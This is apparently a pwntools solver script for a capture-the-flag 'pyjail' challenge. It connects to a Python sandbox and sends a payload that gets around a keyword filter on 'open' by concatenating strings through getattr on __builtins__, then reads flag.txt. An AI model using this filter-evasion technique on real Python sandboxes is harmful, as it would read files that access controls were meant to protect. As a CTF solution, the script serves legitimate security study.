#!/usr/bin/env python3
"""
Solver for penjara pyjail challenge.

Challenge: The word 'open' is blocked (case-insensitive, word boundary).
Solution: Use string concatenation to bypass the filter.

Payload: getattr(__builtins__, 'op'+'en')('flag.txt').read()
"""

from pwn import *

HOST = args.HOST or "localhost"
PORT = int(args.PORT or 9999)

def main():
    io = remote(HOST, PORT)
    
    # Wait for prompt
    io.recvuntil(b">>> ")
    
    # Bypass 'open' filter using string concatenation
    # getattr(__builtins__, 'op'+'en') returns the open() function
    payload = b"getattr(__builtins__, 'op'+'en')('flag.txt').read()"
    
    log.info(f"Sending payload: {payload.decode()}")
    io.sendline(payload)
    
    # Receive flag
    response = io.recvline().decode().strip()
    log.success(f"FLAG: {response}")
    
    io.close()

if __name__ == "__main__":
    main()
